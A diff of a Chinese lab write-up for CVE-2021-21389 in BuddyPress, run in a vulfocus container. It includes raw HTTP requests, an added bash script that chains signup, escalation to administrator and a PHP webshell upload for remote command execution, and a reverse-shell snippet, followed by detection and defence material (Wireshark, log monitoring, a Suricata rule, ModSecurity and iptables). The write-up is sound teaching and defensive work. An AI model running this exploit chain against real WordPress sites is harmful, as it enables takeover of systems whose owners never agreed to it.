@@ -22,20 +22,19 @@ BuddyPress 是一个用于构建社区站点的开源 WordPress 插件。在 7.2
    docker pull vulfocus/samba-cve_2017_7494:latest 
    docker pull c4pr1c3/vulshare_nginx-php-flag:latest
    docker pull vulfocus/apache-cve_2021_41773
-   docker pull vulfocus/weblogic-cve_2020_2555
+   docker pull vulfocus/weblogic-cve_2019_2555
    ```
-   ![1747473863077](image/homework/1747473863077.png)
-   ![1747473881917](image/homework/1747473881917.png)
-   ![1747473893030](image/homework/1747473893030.png)
-   ![1747473905026](image/homework/1747473905026.png)
-   ![1747648013574](image/homework/1747648013574.png)
+   ![1748228876010](image/readme/1748228876010.png)
+   ![1748228896276](image/readme/1748228896276.png)
+   ![1748228922320](image/readme/1748228922320.png)
+   ![1748228954364](image/readme/1748228954364.png)
 
 2. **启动vulfucus环境**
 ![1747896129453](image/readme/1747896129453.png)
 ![1747896152092](image/readme/1747896152092.png)
 
 3. **场景搭建&启动场景**
-![1748168018019](image/readme/1748168018019.png)
+![1748189565806](image/readme/1748189565806.png)
 
 4. **打开浏览器，访问场景地址**
 ![1747897882478](image/readme/1747897882478.png)
@@ -55,7 +54,7 @@ BuddyPress 是一个用于构建社区站点的开源 WordPress 插件。在 7.2
      }
      ```
     - 最终构造的请求包：
-        ```
+        ```http
         POST /wp-json/buddypress/v1/signup HTTP/1.1
         Host: 192.168.20.12:10459
         Upgrade-Insecure-Requests: 1
@@ -71,7 +70,7 @@ BuddyPress 是一个用于构建社区站点的开源 WordPress 插件。在 7.2
 
     - 替换 `Host` 为自己的 IP 和端口。
     - 得到回显:
-        ```
+        ```http
          HTTP/1.1 200 OK
          Date: Thu, 22 May 2025 03:48:36 GMT
          Server: Apache/2.4.18 (Ubuntu)
@@ -87,16 +86,16 @@ BuddyPress 是一个用于构建社区站点的开源 WordPress 插件。在 7.2
          ```
 2. **提取激活密钥**
    - 发送请求后，服务器会返回一个响应包，其中包含 `activation_key`。
-   ![1747885758997](image/homework/1747885758997.png)
+   ![1748229130073](image/readme/1748229130073.png)
    `activation_key` : `aoM0svmO72kVVPbNxYadAKifjIUuYqj8`
    - 提取 `activation_key`，用于后续的激活操作。
 
 3. **构造激活请求**
    - 使用提取的 `activation_key` 构造 PUT 请求，发送到 `/wp-json/buddypress/v1/signup/activate/<activation_key>`。
-   ![1747885790638](image/homework/1747885790638.png)
+   ![1748229140618](image/readme/1748229140618.png)
    - 请求体与注册请求相同。
    - 完整请求包：
-        ```
+        ```http
         PUT /wp-json/buddypress/v1/signup/activate/aoM0svmO72kVVPbNxYadAKifjIUuYqj8 HTTP/1.1
         Host:192.168.20.12:10459
         Upgrade-Insecure-Requests: 1
@@ -109,7 +108,7 @@ BuddyPress 是一个用于构建社区站点的开源 WordPress 插件。在 7.2
         {"user_login": "attcker1", "user_email": "attacker1@163.com", "user_name": "attacker1", "password": "attacker1"}
         ```
     - **得到回显:**
-        ```
+        ```http
         HTTP/1.1 200 OK
         Date: Thu, 22 May 2025 03:49:29 GMT
         Server: Apache/2.4.18 (Ubuntu)
@@ -126,9 +125,9 @@ BuddyPress 是一个用于构建社区站点的开源 WordPress 插件。在 7.2
 4. **登录验证**
    - 使用注册的账号 `attacker1` 和密码 `attacker1` 登录。
    
-   ![1747885902130](image/homework/1747885902130.png)
+   ![1748229151058](image/readme/1748229151058.png)
    - 登录后，用户将获得普通用户权限，但尚未获得管理员权限。
-   ![1747885938881](image/homework/1747885938881.png)
+   ![1748229159901](image/readme/1748229159901.png)
    ![1748069641307](image/readme/1748069641307.png)
 
 ### （三）获取管理员权限
@@ -136,18 +135,18 @@ BuddyPress 是一个用于构建社区站点的开源 WordPress 插件。在 7.2
    - 访问 `http://<your_ip>:<your_port>/groups/create/step/group-details/`。
    - 填写组信息并完成创建。
    - 通过创建用户组，用户将被添加到该组中，为后续的权限提升做准备。
-    ![1747888798026](image/homework/1747888798026.png)
-    ![1747888866380](image/homework/1747888866380.png)
-    ![1747888878196](image/homework/1747888878196.png)
-    ![1747888898177](image/homework/1747888898177.png)
-    ![1747888916532](image/homework/1747888916532.png)
-    ![1747888936571](image/homework/1747888936571.png)
+    ![1748229172877](image/readme/1748229172877.png)
+    ![1748229180474](image/readme/1748229180474.png)
+    ![1748229188133](image/readme/1748229188133.png)
+    ![1748229195716](image/readme/1748229195716.png)
+    ![1748229203384](image/readme/1748229203384.png)
+    ![1748229210722](image/readme/1748229210722.png)
 2. **抓取关键参数**
    - 点击 `manage`，再点击 `members`，使用抓包工具抓取请求。
    - 提取请求中的 `X-WP-Nonce` 和 `Cookie` 参数。
-   ![1747889012605](image/homework/1747889012605.png)
+   ![1748229219600](image/readme/1748229219600.png)
     **cookie:**
-        ```
+        ```http
         grafana_session=7cee305b146bf89decccac3eb414687f; grafana_session_expiry=1747723015; zbx_sessionid=060b0abb1800d98452c40e735dbb58fa; wp-settings-time-2=1747822280; experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzRZVGcyWlRWakxUa3dZamN0TkRNMFl5MDVaREF4TFdZME5EZ3haVFptTVdNd01TST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--a69a8d8efbbef8037dbb261a0526aae27fb6c1b8; metabase.DEVICE=0af33864-c7aa-43fd-89aa-287250f4c715; vue_admin_template_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzQ3OTY5MjYzLCJlbWFpbCI6IiJ9.C9VdlIBrcP4xj1g5TzsBWQosumWuAVXLH1S6Lgzk8nI; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_8232bb51e9fa6ae4bed9f94b4ce661c2=attcker1%7C1748062618%7CGvjHpcyFfFhCylwuqLNafXmiHwJqmZ5VldxGcUkR0Bz%7Ca6226440d0bde4fe9d4cf14cce8fcf49dd365c9f342c5296f67044f265433248; wp-settings-time-3=1747889821
         ```
         **X-WP-Nonce:** ``cb16f80772``
@@ -173,21 +172,21 @@ BuddyPress 是一个用于构建社区站点的开源 WordPress 插件。在 7.2
         Content-Length: 28
         {"roles": "administrator"}
         ```
-     ![1747890470194](image/homework/1747890470194.png)
-     ![1747890494107](image/homework/1747890494107.png)
+     ![1748229231842](image/readme/1748229231842.png)
+     ![1748229248038](image/readme/1748229248038.png)
 
 4. **验证提权结果**
    - 发送请求后，用户角色将被提升为管理员。
    - 再次登录 WordPress 后台，验证是否获得管理员权限，发现 dashboard 页面功能增加。
-   ![1747890528150](image/homework/1747890528150.png)
+   ![1748229256997](image/readme/1748229256997.png)
 
 ### （四）上传木马，获取 Shell
 1. **上传木马文件**
    - 在 WordPress 后台，点击 `Plugins` 模块，选择 `Add New`。
-   ![1747890547884](image/homework/1747890547884.png)
-   ![1747890578223](image/homework/1747890578223.png)
+   ![1748229275135](image/readme/1748229275135.png)
+   ![1748229282868](image/readme/1748229282868.png)
    - 点击 `Upload Plugin`，上传包含一句话木马的 PHP 文件。
-   ![1747890605964](image/homework/1747890605964.png)
+   ![1748229289429](image/readme/1748229289429.png)
    - 木马文件内容如下：
         ```php
         <?php
@@ -195,26 +194,222 @@ BuddyPress 是一个用于构建社区站点的开源 WordPress 插件。在 7.2
         $proc = proc_open("bash -i", array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
         ?>
         ```
-        ![1747890820999](image/homework/1747890820999.png)
+        ![1748229299490](image/readme/1748229299490.png)
 2. **验证木马执行**
    - 上传成功后，访问 `/wp-content/uploads/<year>/<month>/c.php`。
-    ![1747890861599](image/homework/1747890861599.png)
-    ![1747890872341](image/homework/1747890872341.png)
+    ![1748229308986](image/readme/1748229308986.png)
+    ![1748229316228](image/readme/1748229316228.png)
    **第一种方法 :**
       - 通过 URL 参数 `cmd` 执行系统命令，例如：
          ```
          http://<your_ip>:<your_port>/wp-content/uploads/2025/05/c.php?cmd=id
          ```
       - 如果返回用户 ID 信息，则说明木马执行成功，获得了 Shell。
-      ![1747891827132](image/homework/1747891827132.png)
-      ![1747891841145](image/homework/1747891841145.png)
+      ![1748229325617](image/readme/1748229325617.png)
+      ![1748229335224](image/readme/1748229335224.png)
       - 由此,我们找到/tmp目录下的flag,将其输入到场景flag中,成功得分
       flag为`flag-{bmh9a8fd407-0aac-4b54-995d-4bb306a739f5}`
-      ![1747891890594](image/homework/1747891890594.png)
+      ![1748229344291](image/readme/1748229344291.png)
    **第二种方法 :**
       - 我们也可以用 metasploit 获取反弹 shell
-      ![1747893446502](image/homework/1747893446502.png)
-      ![1747893462723](image/homework/1747893462723.png)
+      ![1748229352321](image/readme/1748229352321.png)
+      ![1748229366103](image/readme/1748229366103.png)
+
+### (五) 自动化执行攻击
+1. **利用脚本**
+```bash
+#!/bin/bash
+
+# 生成随机字符的函数
+random_char() {
+    local length=$1
+    cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w "$length" | head -n 1
+}
+
+# 注册函数
+register() {
+    local url=$1
+    local username=$2
+    local password=$3
+
+    local email="$(random_char 7)@test.com"
+    local data="{\"user_login\":\"$username\",\"user_email\":\"$email\",\"user_name\":\"$username\",\"password\":\"$password\"}"
+
+    response=$(curl -s -X POST "$url/wp-json/buddypress/v1/signup" \
+        -H "Content-Type: application/json; charset=UTF-8" \
+        -d "$data" \
+        -w "%{http_code}")
+
+    status_code=${response: -3}
+    response_body=${response::-3}
+
+    if [ "$status_code" -eq 500 ]; then
+        echo "[-] 用户名已存在！"
+        echo "[+] 尝试登录该用户名 ...."
+        login "$url" "$username" "$password"
+    elif [ "$status_code" -eq 404 ]; then
+        echo "[-] 无法注册，因为注册功能已禁用！"
+        exit 1
+    else
+        activation_key=$(echo "$response_body" | jq -r '.[0].activation_key')
+        curl -s -X PUT "$url/wp-json/buddypress/v1/signup/activate/$activation_key" > /dev/null
+    fi
+}
+
+# 登录函数
+login() {
+    local url=$1
+    local username=$2
+    local password=$3
+
+    cookies_file=$(mktemp)
+
+    response=$(curl -s -c "$cookies_file" -X POST "$url/wp-login.php" \
+        -d "log=$username" \
+        -d "pwd=$password" \
+        -w "%{http_code}" \
+        -o /dev/null)
+
+    if [ "$response" -ne 302 ]; then
+        echo "[-] 登录失败！"
+        rm "$cookies_file"
+        exit 1
+    fi
+
+    echo "$cookies_file"
+}
+
+# 创建新群组函数
+createNewgroup() {
+    local url=$1
+    local cookies_file=$2
+    local username=$3
+
+    echo "[+] 创建新群组以获取 X-WP-Nonce"
+
+    response=$(curl -s -b "$cookies_file" "$url/groups/create/step/group-details/")
+
+    if [[ "$response" == *"404 Not Found"* ]]; then
+        echo "[-] 站点需要启用用户群组组件！"
+        exit 1
+    fi
+
+    _wp_nonce=$(echo "$response" | grep -oP 'name="_wpnonce" value="\K[^"]+')
+
+    group_name="cve-2021-21389$username"
+
+    curl -s -b "$cookies_file" -X POST "$url/groups/create/step/group-details/" \
+        -F "group-name=$group_name" \
+        -F "group-desc=$group_name" \
+        -F "_wpnonce=$_wp_nonce" \
+        -F "group-id=0" \
+        -F "save=Create Group and Continue" > /dev/null
+
+    response=$(curl -s -b "$cookies_file" "$url/groups/$group_name/admin/manage-members/")
+    x_wp_nonce=$(echo "$response" | grep -oP 'var wpApiSettings = .*?"nonce":"\K[^"]+')
+
+    echo "$x_wp_nonce"
+}
+
+# 提权函数
+privilegeEscalation() {
+    local url=$1
+    local cookies_file=$2
+    local x_wp_nonce=$3
+
+    echo "[+] 提权为管理员！"
+
+    data='{"roles":"administrator"}'
+
+    curl -s -b "$cookies_file" -X POST "$url/wp-json/buddypress/v1/members/me" \
+        -H "X-WP-Nonce: $x_wp_nonce" \
+        -H "Content-Type: application/json; charset=UTF-8" \
+        -d "$data" > /dev/null
+}
+
+# 远程代码执行函数
+rce() {
+    local url=$1
+    local cookies_file=$2
+    local command=$3
+
+    echo "[+] 检查 RCE ..."
+
+    response=$(curl -s -b "$cookies_file" "$url/wp-admin/plugin-install.php")
+
+    if [[ "$response" == *"403 Forbidden"* ]]; then
+        echo "[-] 你不是管理员！"
+        exit 1
+    fi
+
+    _wp_nonce=$(echo "$response" | grep -oP 'name="_wpnonce" value="\K[^"]+')
+
+    filename="cve202121389.php"
+    php_payload="<?php system(\$_GET['cmd']); ?>"
+
+    # 创建临时文件存储 payload
+    payload_file=$(mktemp)
+    echo "$php_payload" > "$payload_file"
+
+    # 创建临时文件存储响应
+    response_file=$(mktemp)
+
+    curl -s -b "$cookies_file" -X POST "$url/wp-admin/update.php?action=upload-plugin" \
+        -F "_wpnonce=$_wp_nonce" \
+        -F "pluginzip=@$payload_file;filename=$filename" \
+        -F "install-plugin-submit=Install Now" \
+        -o "$response_file"
+
+    rm "$payload_file"
+
+    year=$(date +%Y)
+    month=$(date +%m)
+
+    echo "[+] 通过 $command 命令执行 RCE："
+    link_shell="$url/wp-content/uploads/$year/$month/$filename?cmd=$command"
+    response=$(curl -s -b "$cookies_file" "$link_shell")
+    echo "$response"
+    echo "[+] RCE 链接："
+    echo "$link_shell"
+    echo "[+] 完成！"
+
+    rm "$response_file"
+}
+
+# 主函数
+main() {
+    if [ "$#" -ne 4 ]; then
+        echo "[+] 用法: $0 <目标> <新用户名> <新密码> <命令>"
+        echo "[+] 示例: $0 http://test.local test 1234 whoami"
+        exit 1
+    fi
+
+    url=$1
+    username=$2
+    password=$3
+    command=$4
+
+    echo "[+] 尝试注册 ..."
+    register "$url" "$username" "$password"
+
+    echo "[+] 尝试登录 ..."
+    cookies_file=$(login "$url" "$username" "$password")
+    echo "[+] 登录成功！"
+
+    x_wp_nonce=$(createNewgroup "$url" "$cookies_file" "$username")
+
+    privilegeEscalation "$url" "$cookies_file" "$x_wp_nonce"
+
+    rce "$url" "$cookies_file" "$command"
+
+    # 清理 cookies 文件
+    rm "$cookies_file"
+}
+
+main "$@"
+```
+![1748220636460](image/readme/1748220636460.png)
+
 
 
 ## 五、漏洞原理分析
@@ -230,9 +425,9 @@ BuddyPress 是一个用于构建社区站点的开源 WordPress 插件。在 7.2
 
 ---
 
-## PART2 漏洞利用
-
+## PART2 漏洞利用检测
 ### 手动检测
+#### [ 方法一 ]
 1. **wireshark抓包**
    我们可以利用wireshark抓包来查看攻击行为。
    ```bash
@@ -241,14 +436,57 @@ BuddyPress 是一个用于构建社区站点的开源 WordPress 插件。在 7.2
    ![1747914135600](image/readme/1747914135600.png)
    打开``wireshark``并分析 : 
    ![1747914180373](image/readme/1747914180373.png)
-   **此处需要加上分析结果 !**
+   **过滤http , 分析其中一个包 , 右键follow ->http stream**
+   ![1748236380067](image/readme/1748236380067.png)
+   ![1748236450360](image/readme/1748236450360.png)
+   针对WordPress站点BuddyPress插件的API请求：
+
+   ```
+   PUT /wp-json/buddypress/v1/signup/activate/v6EeK8XWihRsxXvXAWPMVzSTO2gs7WdF HTTP/1.1
+   ```
+
+   - **方法**: PUT 
+   - **端点**: `/wp-json/buddypress/v1/signup/activate/v6EeK8XWihRsxXvXAWPMVzSTO2gs7WdF`
+   - BuddyPress的REST API端点
+   - 尝试激活一个用户注册(v6EeK8XWihRsxXvXAWPMVzSTO2gs7WdF是激活密钥)
+   - **请求体**: 
+      ```json
+      {
+         "user_login": "attacker2",
+         "user_email": "attacker2@163.com",
+         "user_name": "attacker2",
+         "password": "attacker2"
+      }
+      ```
+      - 尝试创建/激活用户"attacker2"
+   - **状态码**: 404 Not Found
+      ```
+      HTTP/1.1 404 Not Found
+      ```
+   - **响应体**:
+      ```json
+      {
+         "code": "bp_rest_invalid_activation_key",
+         "message": "Invalid activation key.",
+         "data": {
+            "status": 404
+         }
+      }
+      ```
+
+   1. **攻击行为**:
+      - 尝试通过BuddyPress API创建/激活用户账户
+
+   2. **回显**:
+      - 服务器返回404和"Invalid activation key"
+      - 表明提供的激活密钥无效或已过期
 
 ---
 
 ### 自动化检测
+#### [ 方法一 ]
 1. **监听日志**
-   我们可以看到 `/etc/init.d/mysql restart` 和 `/etc/init.d/apache2 restart` 这两个命令，所以我们可以利用这个漏洞来获取管理员权限。
-   这说明容器的日志很有可能写入了 `/var/log/apache2/access.log` 文件，所以我们可以实时监听这个文件，并查看注册或权限提升的尝试行为。
+   进入wordpress容器中查看启动文件``start.sh`` , 我们可以看到 `/etc/init.d/mysql restart` 和 `/etc/init.d/apache2 restart` 这两个命令，这说明容器的日志很有可能写入了 `/var/log/apache2/access.log` 文件，所以我们可以实时监听这个文件，并查看注册或权限提升的尝试行为。
    ```bash
    root@3efe65610f5a:/# 
    cat start.sh
@@ -287,21 +525,21 @@ BuddyPress 是一个用于构建社区站点的开源 WordPress 插件。在 7.2
                   elif re.search(r'/wp-admin', line) and 'wp-login.php' not in line:
                      print("[*] 后台访问行为检测到: {}".format(line.strip()))
 
-                  elif re.search(r'union.*select', line, re.IGNORECASE):
-                     print("[!!!] SQL注入尝试检测到: {}".format(line.strip()))
-
       except Exception as e:
          print("[!] 错误: {}".format(e))
 
    if __name__ == "__main__":
       monitor_access_log("/var/log/apache2/access.log")
    ```
+   - 当攻击者注册时
    ![1747911181136](image/readme/1747911181136.png)
+   - 当攻击者激活时
    ![1747911640431](image/readme/1747911640431.png)
-   可以发现监听到了攻击行为。
+   可以发现均监听到了相应的攻击行为。
 
 ---
 
+#### [ 方法二 ]
 2. **goaccess 日志分析工具**
 GoAccess 是一个开源的实时日志分析工具，专门用于分析 Web 服务器日志文件。它能够快速解析 Apache、Nginx 等常见 Web 服务器生成的日志，并提供直观的可视化统计信息，帮助安全人员和运维人员快速发现异常行为或潜在攻击。
 - 为了使用 GoAccess 进行日志分析，首先需要安装它：
@@ -309,8 +547,8 @@ GoAccess 是一个开源的实时日志分析工具，专门用于分析 Web 服
    root@3efe65610f5a:/# 
    apt update && apt install goaccess
    ```
-- 接下来我们使用 GoAccess 对 `/var/log/apache2/access.log` 文件进行分析：
    ![1747912555913](image/readme/1747912555913.png)
+- 接下来我们使用 GoAccess 对 `/var/log/apache2/access.log` 文件进行分析：
    ```bash
    root@3efe65610f5a:/# 
    goaccess -f /var/log/apache2/access.log \
@@ -387,7 +625,86 @@ GoAccess 是一个开源的实时日志分析工具，专门用于分析 Web 服
 
 ---
 
-3. **suritata**
+#### [ 方法三 ]
+
+3. **suricata检测**
+   Suricata 是一个高性能的开源网络 IDS（入侵检测系统）、IPS（入侵防御系统）和网络安全监控引擎。它能够实时分析网络流量，检测恶意行为，并通过规则匹配识别攻击模式。
+
+   **1. 安装启动 Suricata**
+   ```bash
+   docker run -d --name suricata --net=host -e SURICATA_OPTIONS="-i eth1" jasonish/suricata:6.0.4
+   ```
+   - `suricata` 包含了核心引擎和默认规则集。
+   - 安装完成后，默认配置文件位于 `/etc/suricata/suricata.yaml`。
+   **2. 编辑 Suricata 配置文件**
+      - 首先进入容器内部
+      ```bash
+      docker exec -it suricata bash
+      ```
+      - 创建一个自定义规则文件 , 写入：
+      ```bash 
+      echo '
+      alert http $EXTERNAL_NET any -> $HOME_NET any (
+         msg:"CVE-2021-21389: BuddyPress 提权尝试";
+         flow:to_server,established;
+         content:"POST"; http_method;
+         content:"/wp-json/buddypress/v1/members/me"; http_uri;
+         content:"roles"; http_client_body; fast_pattern;
+         content:"administrator"; http_client_body;
+         sid:1000001;
+         rev:1;
+         classtype:web-application-attack;
+         )' > /etc/suricata/rules/cve-2021-21389.rules
+      ```
+      - 加载自定义规则
+      ```bash
+      sudo vim /etc/suricata/suricata.yaml
+      ```
+      在 ``rule-files:`` 下添加一行：
+      ```bash
+       - cve-2021-21389.rules
+      ```
+      ##### **规则解释：**
+
+      | 字段 | 说明 |
+      |------|------|
+      | `alert http` | 表示这是一个 HTTP 协议的告警规则 |
+      | `$EXTERNAL_NET any -> $HOME_NET any` | 表示从外部网络发起请求到内部网络主机的任意端口 |
+      | `msg` | 告警信息描述 |
+      | `flow:to_server,established` | 仅匹配已建立连接的服务器方向流量 |
+      | `content:"POST"` + `http_method` | 匹配 POST 请求方法 |
+      | `content:"/wp-json/buddypress/v1/members/me"` + `http_uri` | 匹配请求 URI 是否包含特定路径 |
+      | `content:"roles"` + `http_client_body` + `fast_pattern` | 快速匹配请求体中的 "roles" 字段 |
+      | `content:"administrator"` + `http_client_body` | 匹配请求体中是否包含 `"administrator"` |
+      | `sid:1000001` | 规则唯一 ID |
+      | `rev:1` | 规则版本号 |
+      | `classtype:web-application-attack` | 分类为 Web 应用攻击 |
+
+      **3. 重启docker**
+      ```bash
+      sudo systemctl restart suricata
+      ```
+      **4. 触发攻击并验证检测效果**
+      打开另一个终端，发送提权请求：
+      ```bash
+      curl -X POST http://<your_wordpress_ip>/wp-json/buddypress/v1/members/me \
+         -H "X-WP-Nonce: <valid_nonce>" \
+         -H "Content-Type: application/json" \
+         -d '{"roles": "administrator"}'
+      ```
+      替换 `<your_wordpress_ip>` 和 `<valid_nonce>` 为你实际的测试目标地址和有效的 Nonce 值。
+      **5. 查看 Suricata 告警日志**
+      - 切换回运行 Suricata 的终端，或查看日志文件：
+         ```bash
+         tail -f /var/log/suricata/fast.log
+         ```
+      - 可以看到终端中出现日志：
+         ```
+         [**] [1:1000001:1] CVE-2021-21389: BuddyPress 提权尝试 [**]
+         [Priority: 1]
+         05/22-14:23:17.123456 [ET.http] POST /wp-json/buddypress/v1/members/me HTTP/1.1
+         ```
+      - 这表明 Suricata 成功检测到了 CVE-2021-21389 提权攻击尝试。
 
 ---
 
@@ -616,13 +933,13 @@ SecRule REQUEST_BODY "@rx \"roles\"\s*:\s*\"administrator\"" \
 sudo vim /etc/apache2/ports.conf
 ```
 将 `Listen 80` 改为 `Listen 81`。
-
+![1748236550489](image/readme/1748236550489.png)
 编辑虚拟主机配置文件：
 ```bash
 sudo vim /etc/apache2/sites-available/000-default.conf
 ```
 将 `<VirtualHost *:80>` 改为 `<VirtualHost *:81>`。
-
+![1748236586413](image/readme/1748236586413.png)
 重启 Apache：
 ```bash
 sudo systemctl restart apache2
@@ -691,7 +1008,7 @@ sudo systemctl restart apache2
 
 ---
 
-### **总结**
+### **总结一下**
 - 直接 `curl` `23509` 端口可以测试 wordpress提权 漏洞，但无法测试 WAF 的效果。
 - 通过反向代理的方式，可以让请求经过 Apache 和 ModSecurity，从而测试 WAF 是否能够拦截恶意请求。
 - 使用 `curl` 向 `81` 端口发送请求，验证 WAF 是否生效。
@@ -732,8 +1049,8 @@ wordpress 测试环境仍然运行在 23509 端口：Apache 会将通过 WAF 检
    - 返回 403 Forbidden ，说明 WAF 拦截了请求。
    - 这表明 Apache 配置了 ModSecurity 规则，检测到了某些可疑内容。
 
-2. **`curl` 访问 `8080` 端口（wordpress 测试环境）**：
-   - 可以访问成功，说明流量绕过了 WAF。
+2. **`curl` 访问 `23509` 端口（wordpress 测试环境）**：
+   - 可以访问成功，流量绕过了 WAF。
 
 ---
 
@@ -752,12 +1069,12 @@ sudo iptables -t nat -L -n -v
 ```bash
 Chain PREROUTING (policy ACCEPT 0 packets, 0 bytes)
  pkts bytes target     prot opt in     out     source               destination         
-    0     0 REDIRECT   tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:8080 redir ports 81
+    0     0 REDIRECT   tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:23509 redir ports 81
 ```
 
 如果没有这条规则，说明 iptables 规则未生效。重新添加规则：
 ```bash
-sudo iptables -t nat -A PREROUTING -p tcp --dport 8080 -j REDIRECT --to-port 81
+sudo iptables -t nat -A PREROUTING -p tcp --dport 23509 -j REDIRECT --to-port 81
 ```
 
 #### **保存 iptables 规则**
@@ -780,8 +1097,8 @@ sudo iptables-save | sudo tee /etc/iptables/rules.v4
    ```bash
    <VirtualHost *:81>
        ProxyPreserveHost On
-       ProxyPass / http://127.0.0.1:8080/
-       ProxyPassReverse / http://127.0.0.1:8080/
+       ProxyPass / http://127.0.0.1:23509/
+       ProxyPassReverse / http://127.0.0.1:23509/
    </VirtualHost>
    ```
 
@@ -810,7 +1127,7 @@ sudo systemctl restart apache2
 ### **3. 检查 Target Server 监听地址**
 
 #### **确认 Target Server 绑定到 `localhost`**
-1. 修改 Target Server 也就是wordpress服务的docker，使其仅监听 `127.0.0.1:8080`。
+1. 修改 Target Server 也就是wordpress服务的docker，使其仅监听 `127.0.0.1:23509`。
    - 例如，如果 Target Server 是一个 Java 应用，可以在启动命令中指定绑定地址：
      ```bash
      ┌──(kali㉿kali)-[~/workspace/ctf-games/fofapro/vulfocus]
@@ -828,7 +1145,7 @@ sudo systemctl restart apache2
    ![1747963395690](image/readme/1747963395690.png)
    ![1747963425567](image/readme/1747963425567.png)
 
-2. 确保 Target Server 不再监听外部地址（如 `0.0.0.0:8080`）。
+2. 确保 Target Server 不再监听外部地址（如 `0.0.0.0:23509`）。
 
 ---
 
@@ -837,7 +1154,7 @@ sudo systemctl restart apache2
 #### **测试 iptables 重定向**
 1. 运行以下命令，测试 iptables 重定向是否生效：
    ```bash
-   curl http://<Target-IP>:8080/
+   curl http://<Target-IP>:23509/
    ```
    - 如果配置正确，流量会被重定向到 `81` 端口，并经过 WAF。
 
@@ -857,7 +1174,7 @@ sudo systemctl restart apache2
    ```
 
    这时我们再curl 一下,会发现了返回我们想要的指定指令,证明了我们攻击防御成功!
-   - `curl wordpress` 服务所在的8080端口返回的内容 `could not connect to server`
+   - `curl wordpress` 服务所在的 23509 端口返回的内容 `could not connect to server`
    - `curl WAF` 服务所在的81端口返回的内容 `403 Forbidden`
    ![1747963078269](image/readme/1747963078269.png)
 
